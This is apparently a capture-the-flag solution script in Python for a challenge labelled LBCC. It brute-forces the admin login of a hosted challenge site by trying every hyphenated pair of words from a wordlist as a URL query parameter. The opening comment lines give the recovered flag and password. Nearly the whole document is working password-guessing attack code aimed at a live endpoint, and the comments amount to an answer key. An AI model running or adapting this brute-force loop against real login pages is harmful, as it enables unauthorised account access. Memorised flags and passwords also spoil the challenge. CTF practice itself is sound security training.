#Flag: LBCC{y0u_b4sh3d_d0wn_th3_d00r}
#Password: 123456-spongebob

import requests
import sys

with open("bruteforce_bonanza.txt", "r") as file:
    word_dictionary = file.read().splitlines()

url_base = "https://lbcc-bonanza.azurewebsites.net/?username=admin&password="

for word1 in word_dictionary:
    for word2 in word_dictionary:
        password = (word1 + "-" + word2)

        url = url_base + password
        response = requests.get(url)

        if response.status_code == 200:
                        
            start_index = response.text.find("LBCC{")
            end_index = response.text.find("}", start_index)

            flag = response.text[start_index:end_index + 1]

            print("Flag:", flag)
            print("Password:", password)
            sys.exit()